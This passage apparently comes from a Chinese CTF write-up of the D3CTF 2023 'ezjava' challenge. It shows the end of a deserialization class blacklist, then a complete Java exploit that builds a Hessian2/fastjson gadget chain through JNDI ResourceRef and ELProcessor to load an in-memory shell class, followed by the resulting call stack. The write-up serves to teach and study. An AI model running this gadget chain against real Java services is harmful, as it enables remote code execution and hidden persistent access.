</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>config</span><span class=p>.</span><span class=na>PropertyPathFactoryBean</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>beans</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>DefaultListableBeanFactory$DependencyObjectFactory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>cache</span><span class=p>.</span><span class=na>interceptor</span><span class=p>.</span><span class=na>BeanFactoryCacheOperationSourceAdvisor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>expression</span><span class=p>.</span><span class=na>spel</span><span class=p>.</span><span class=na>ast</span><span class=p>.</span><span class=na>Indexer$PropertyIndexingValueRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>expression</span><span class=p>.</span><span class=na>spel</span><span class=p>.</span><span class=na>ast</span><span class=p>.</span><span class=na>MethodReference$MethodValueRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>JndiObjectTargetSource</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>SimpleJndiBeanFactory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>orm</span><span class=p>.</span><span class=na>jpa</span><span class=p>.</span><span class=na>AbstractEntityManagerFactoryBean</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>transaction</span><span class=p>.</span><span class=na>jta</span><span class=p>.</span><span class=na>JtaTransactionManager</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sun</span><span class=p>.</span><span class=na>rmi</span><span class=p>.</span><span class=na>server</span><span class=p>.</span><span class=na>UnicastRef</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sun</span><span class=p>.</span><span class=na>swing</span><span class=p>.</span><span class=na>SwingLazyValue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sun</span><span class=p>.</span><span class=na>print</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>查看依赖</p><p><img src=/p/d3ctf-2023-ezjava/3.png width=1086 height=1096 loading=lazy alt=img></p><h2 id=exp1>exp1</h2><p>说实话第一次做这种 ssrf 的 Java 题思路很乱，首先打入 registry 内存马，由于 server 每次都会来获取黑名单，所以做一个拦截，给非空的无害黑名单，再打入一次内存马即可。使用的 gadget 几乎是微调一下 我写的 <a class=link href=https://baozongwi.xyz/p/resin-deserialization-vuln/ target=_blank rel=noopener>https://baozongwi.xyz/p/resin-deserialization-vuln/</a> 中后面两个 poc，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.alibaba.fastjson.JSONObject</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Input</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Output</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.naming.ResourceRef</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.CannotProceedException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.StringRefAddr</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.directory.DirContext</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.net.URLEncoder</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Hashtable</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exp1</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//CtClass clazz = pool.get(SpringInterceptorBehinderForEzJava.class.getName());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>Evil</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>clazz</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>clazz_base64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>code</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64(&#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>clazz_base64</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;var method = java.lang.ClassLoader.class.getDeclaredMethod(&#39;defineClass&#39;, &#39;&#39;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;method.setAccessible(true);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;clazz.newInstance();&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ResourceRef</span><span class=w> </span><span class=n>ref</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ResourceRef</span><span class=p>(</span><span class=s>&#34;javax.el.ELProcessor&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>,</span><span class=w> </span><span class=s>&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ref</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StringRefAddr</span><span class=p>(</span><span class=s>&#34;forceString&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;x=eval&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ref</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StringRefAddr</span><span class=p>(</span><span class=s>&#34;x&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>code</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;)&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazzc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;javax.naming.spi.ContinuationDirContext&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>constructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazzc</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>CannotProceedException</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Hashtable</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>constructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CannotProceedException</span><span class=w> </span><span class=n>cpe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CannotProceedException</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cpe</span><span class=p>.</span><span class=na>setResolvedObj</span><span class=p>(</span><span class=n>ref</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>DirContext</span><span class=w> </span><span class=n>ctx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>DirContext</span><span class=p>)</span><span class=w> </span><span class=n>constructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>cpe</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hashtable</span><span class=o>&lt;&gt;</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>JSONObject</span><span class=w> </span><span class=n>jsonObject</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>JSONObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>jsonObject</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;test&#34;</span><span class=p>,</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Hessian2_serialize</span><span class=p>(</span><span class=n>jsonObject</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(data)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2_unserialize</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>Hessian2_serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Output</span><span class=w> </span><span class=n>hessian2Output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Output</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>67</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>getSerializerFactory</span><span class=p>().</span><span class=na>setAllowNonSerializable</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>o</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>Hessian2_unserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Input</span><span class=w> </span><span class=n>hessian2Input</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Input</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>o</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/d3ctf-2023-ezjava/4.png width=2514 height=1336 loading=lazy alt=img></p><p>调用栈</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>el</span><span class=p>.</span><span class=na>ELProcessor</span><span class=p>.</span><span class=na>eval</span><span class=p>(</span><span class=n>ELProcessor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>54</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke0</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>62</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>43</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>498</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>BeanFactory</span><span class=p>.</span><span class=na>getObjectInstance</span><span class=p>(</span><span class=n>BeanFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>210</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>NamingManager</span><span class=p>.</span><span class=na>getObjectInstance</span><span class=p>(</span><span class=n>NamingManager</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>321</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>NamingManager</span><span class=p>.</span><span class=na>getContext</span><span class=p>(</span><span class=n>NamingManager</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>439</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ContinuationContext</span><span class=p>.</span><span class=na>getTargetContext</span><span class=p>(</span><span class=n>ContinuationContext</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>55</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ContinuationContext</span><span class=p>.</span><span class=na>getEnvironment</span><span class=p>(</span><span class=n>ContinuationContext</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>197</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>javax</span><span class=p>.</span><span class=na>naming</span><span class=p>.</span><span class=na>spi</span><span class=p>.</span><span class=na>ContinuationDirContext$$Lambda$25</span><span class=p>.</span><span class=na>1026871825</span><span class=p>.</span><span class=na>apply</span><span class=p>(</span><span class=n>Unknown</span><span class=w> </span><span class=n>Source</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>FieldWriterObjectFunc</span><span class=p>.</span><span class=na>getFieldValue</span><span class=p>(</span><span class=n>FieldWriterObjectFunc</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>36</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>FieldWriterObject</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>FieldWriterObject</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>189</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>ObjectWriter2</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>ObjectWriter2</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>76</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>writer</span><span class=p>.</span><span class=na>ObjectWriterImplMap</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>ObjectWriterImplMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>548</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson2</span><span class=p>.</span><span class=na>JSON</span><span class=p>.</span><span class=na>toJSONString</span><span class=p>(</span><span class=n>JSON</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2388</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>alibaba</span><span class=p>.</span><span class=na>fastjson</span><span class=p>.</span><span class=na>JSONObject</span><span class=p>.</span><span class=na>toString</span><span class=p>(</span><span class=n>JSONObject</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1028</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>.</span><span class=na>valueOf</span><span class=p>(</span><span class=n>String</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2994</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>StringBuilder</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>StringBuilder</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>131</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>expect</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>3757</span><span class=p>)</span><span class=w>
